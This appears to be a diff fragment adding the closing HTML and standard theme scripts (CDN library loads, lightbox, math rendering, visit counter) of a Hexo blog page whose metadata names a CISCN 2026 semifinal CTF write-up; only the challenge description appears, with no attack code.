+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "CISCN2026半决赛复现",
+          url: "http://example.com/2026/03/24/CISCN2026%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: " IntraBadge 1某企业开发了一套用于内部员工展示的“徽章卡片系统”，员工可自定义展示模板并填写头像 URL，由系统自动抓取并缓存头像资源后进行页面渲染。在开发阶段，为了便于调试与快速上线，部分模板渲染与资源抓取功能未进行严格安全限制。  break app.py: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606",
+          date: "Tue Mar 24 2026 11:19:17 GMT+0800",
+          updated: "Thu Apr 16 2026 21:08:05 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
